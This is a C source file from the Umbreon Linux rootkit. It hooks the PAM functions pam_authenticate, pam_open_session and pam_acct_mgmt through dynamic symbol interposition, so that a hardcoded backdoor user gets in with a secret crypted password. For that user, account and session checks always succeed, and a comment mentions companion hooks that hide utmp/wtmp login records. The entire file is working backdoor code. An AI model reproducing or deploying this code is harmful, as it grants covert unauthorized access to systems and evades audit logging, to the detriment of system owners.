/* this shit's pretty cool but useless on its own
needs some hooks for utmp/wtmp logging, those are in main file
PAM hooks - thanks to ErrProne*/
#include "umbreon.h"
int pam_authenticate(pam_handle_t *pamh, int flags) {
    void *user;
    char *pw;
    int ret;
    if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
    if (!libpam) libpam=dlopen(LIBPAM_PATH,RTLD_LAZY);
    if (!old_fopen) old_fopen = dlsym(libc,"fopen");
    if (!old_pam_authenticate) old_pam_authenticate = dlsym(libpam, "pam_authenticate");
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    if((char *)user == NULL) return old_pam_authenticate(pamh,flags); // bail!
    if (!strcmp((char *)user, BD_USER))  {
      if(!strcmp(get_my_procname(), "login")) return old_pam_authenticate(pamh,flags);
      logflag = 1;
      pam_prompt(pamh,1,&pw,"%s", "* Password for "BD_USER": ");
      // This will show up if SSHd challenge-response auth is on. It will work regardless.
      if(!strcmp(crypt(pw,BD_CRYPT_PASS),BD_CRYPT_PASS)) return PAM_SUCCESS;
      return PAM_USER_UNKNOWN;
    }
    ret = old_pam_authenticate(pamh, flags);
    return ret;
}
int pam_open_session(pam_handle_t *pamh, int flags) {
    void *user;
    if (!libpam) libpam=dlopen(LIBPAM_PATH,RTLD_LAZY);
    if (!old_pam_open_session) old_pam_open_session = dlsym(libpam, "pam_open_session");
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    if((char *)user == NULL) return old_pam_open_session(pamh,flags); // bail!
    if (!strcmp(user,BD_USER)) return PAM_SUCCESS;
    return old_pam_open_session(pamh, flags);
}
int pam_acct_mgmt(pam_handle_t *pamh, int flags) {
    void *user;
    if (!libpam) libpam=dlopen(LIBPAM_PATH,RTLD_LAZY);
    if (!old_pam_acct_mgmt) old_pam_acct_mgmt = dlsym(libpam, "pam_acct_mgmt");
    pam_get_item(pamh, PAM_USER, (const void **)&user);
    if((char *)user == NULL) return old_pam_acct_mgmt(pamh,flags); // bail!
    if (!strcmp(user, BD_USER)) return PAM_SUCCESS;
    return old_pam_acct_mgmt(pamh, flags);
}
